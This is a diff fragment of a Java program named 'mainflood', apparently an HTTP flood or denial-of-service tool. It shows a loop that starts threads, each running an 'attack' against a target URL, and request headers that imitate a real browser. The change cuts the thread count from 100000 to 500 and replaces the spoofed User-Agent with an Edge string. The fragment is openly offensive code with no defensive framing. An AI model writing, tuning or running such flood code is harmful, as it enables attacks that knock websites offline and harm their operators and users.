@@ -76,7 +76,7 @@ public class mainflood {
 
         ArrayList<Thread> threads = new ArrayList<Thread>();
 
-        for (int i = 0; i < 100000; i++) {
+        for (int i = 0; i < 500; i++) {
 
             Thread t = new Thread(new attack(url));
 
@@ -216,7 +216,7 @@ public class mainflood {
 
                             "Upgrade-Insecure-Requests", "1",
 
-                            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4324.104 Safari/537.36",
+                            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
 
                             "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
 
